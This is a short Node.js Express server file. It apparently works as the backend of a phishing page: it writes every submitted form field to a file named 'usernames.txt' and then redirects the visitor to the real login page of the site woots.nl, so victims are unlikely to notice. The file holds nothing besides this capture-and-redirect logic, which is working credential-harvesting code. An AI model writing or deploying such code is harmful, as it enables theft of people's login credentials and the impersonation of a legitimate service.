// server.js
const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/processFormData', (req, res) => {
  const formData = req.body;

  // Write form data to a file
  const dataToWrite = Object.entries(formData).map(([key, value]) => `${key}-${value}`).join('\n') + '\n\n';
  fs.appendFile('usernames.txt', dataToWrite, (err) => {
    if (err) throw err;
    console.log('Data written to usernames.txt');
  });

  // Redirect the user to woots.nl/login after processing the form data
  res.redirect('https://woots.nl/login');
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});
